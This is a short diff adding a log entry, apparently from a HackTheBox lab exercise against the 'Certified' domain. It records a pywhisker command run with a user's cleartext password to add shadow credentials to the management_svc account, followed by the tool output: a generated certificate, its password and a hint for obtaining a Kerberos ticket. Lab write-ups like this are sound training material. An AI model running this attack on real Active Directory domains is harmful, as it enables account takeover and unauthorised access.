@@ -1,0 +1,18 @@
+### [2026-04-05 23:34:38] pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
+
+$ pywhisker -d certified.htb -u judith.mader -p judith09 --target management_svc --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 5f7a7563-b426-2df5-5da7-eb5ff0d86378
+[*] Updating the msDS-KeyCredentialLink attribute of management_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: sdin6t1L.pfx
+[*] Must be used with password: Vo0bUFIlwobW0dnHEWVq
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+
+# Exit code: 0
+# Duration: 2026-04-05 23:34:39
